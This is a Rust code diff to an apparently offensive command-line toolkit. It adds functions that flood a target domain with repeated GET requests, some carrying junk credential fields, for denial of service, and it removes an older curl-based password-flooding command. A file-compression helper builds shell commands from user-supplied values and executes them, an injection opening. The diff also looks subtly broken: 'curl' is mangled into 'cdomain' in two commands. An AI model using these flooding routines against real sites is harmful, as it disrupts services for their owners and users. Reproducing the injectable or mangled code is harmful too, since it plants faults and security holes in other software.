@@ -1,12 +1,14 @@
 use crate::modules::core::core::*;
-use crate::modules::core::data::*;
 use crate::modules::core::structs::DataSet;
+use crate::modules::network::structs::*;
+use std::collections::HashMap;
 
-pub fn dns(argsv: Vec<String>) -> i32 {
+/// Revice --domain
+pub fn map_dns(argsv: &[String]) -> i32 {
     //Check if domain key exists
-    if search_value("domain".to_string(), argsv.clone()) == "".to_string() {
+    if search_value("domain", argsv).is_empty() {
         raise("Domain name not found, quit!", 4);
-        return 1;
+        return 42;
     }
 
     let record_types = vec![
@@ -18,7 +20,7 @@ pub fn dns(argsv: Vec<String>) -> i32 {
         let name = format!("dns.{}", record_type.to_lowercase());
         let set = DataSet::from_str("", &name, &meta);
 
-        bob(set, argsv.clone());
+        flawless_exec(set, argsv);
     }
 
     // Perform extra scans
@@ -27,22 +29,68 @@ pub fn dns(argsv: Vec<String>) -> i32 {
         DataSet::from_str(
             "",
             "extras.robots.txt",
-            "curl -sS -L https://@@domain/robots.txt",
+            "cdomain -sS -L https://@@domain/robots.txt",
         ),
         DataSet::from_str(
             "",
             "extras.sitemap",
-            "curl -sS -L https://@@domain/sitemap.xml",
+            "cdomain -sS -L https://@@domain/sitemap.xml",
         ),
     ];
     for extra in extras {
-        bob(extra, argsv.clone());
+        flawless_exec(extra, argsv);
     }
 
     return 0;
 }
 
-pub fn plugin_file_compact(argsv: Vec<String>) -> i32 {
+/// Need:
+/// --domain domain
+/// --times int
+pub fn dos_simple_get_span(argsv: &[String]) -> i32 {
+    let mut req = Request::new();
+    req.url = search_value("domain", argsv);
+    req.method = "GET".to_string();
+
+    let times = seach_number_value("times", argsv);
+
+    for _i in 0..times {
+        let out = req.make();
+        println!("{} - {}", out.url, out.status);
+    }
+    return 0;
+}
+
+/// Need:
+/// --size int Size of string attak
+/// --domain domain  Target domain
+/// --times int
+pub fn dos_long_auth_span(argsv: &[String]) -> i32 {
+    let size = seach_number_value("size", argsv);
+    let seed = "3l34_=3k4vç~4vu,,20-v";
+    let mut req = Request::new();
+    req.url = search_value("domain", argsv);
+    req.method = "GET".to_string();
+    req.body = Some(HashMap::from([
+        ("user", seed),
+        ("pass", seed),
+        ("username", seed),
+        ("password", seed),
+        ("token", seed),
+        ("auth", seed),
+    ]));
+
+    let times = seach_number_value("times", argsv);
+
+    for _i in 0..times {
+        let out = req.make();
+        println!("{} - {}", out.url, out.status);
+    }
+    return 0;
+}
+
+/// Compress and Decompress files
+pub fn file_compact(argsv: Vec<String>) -> i32 {
     let extensions = vec![
         ("7z", "7z x @@file", "7z a @@folder"),
         ("arj", "arj x @@file", "arj a @@folder"),
@@ -75,32 +123,24 @@ pub fn plugin_file_compact(argsv: Vec<String>) -> i32 {
         ("zip", "unzip @@file", "zip -r @@folder"),
     ];
 
-    let mut option = search_value("type".to_string(), argsv.clone());
+    let option = search_value("type", &argsv);
     let mut command = String::new();
 
     if option == "decompress" {
-        let file = search_value("file".to_string(), argsv.clone());
-        for (ext, decomp, comp) in extensions {
+        let file = search_value("file", &argsv);
+        for (ext, decomp, _comp) in extensions {
             if file.ends_with(ext) {
-                command = lazy_loop(decomp, argsv.clone());
+                command = lazy_parser(decomp, &argsv);
             }
         }
     } else {
-        let format = search_value("ext".to_string(), argsv.clone());
-        for (ext, decomp, comp) in extensions {
+        let format = search_value("ext", &argsv);
+        for (ext, _decomp, comp) in extensions {
             if ext == format {
-                command = lazy_loop(comp, argsv.clone());
+                command = lazy_parser(comp, &argsv);
                 println!("{}", command);
             }
         }
     }
-
-    return 0;
-}
-
-pub fn dos_long_password(argsv: Vec<String>, cmd: &str) -> i32 {
-    let cmd = "curl -X POST @@domain -H 'Content-Type: application/json' -d \
-        '{\"username\": \"random_user_\"$(openssl rand -base64 @@size),\
-        \"password\": \"random_password_\"$(openssl rand -base64 @@size)}'";
-    return lazy_exec_loop(argsv, cmd);
+    lazy_exec(command)
 }
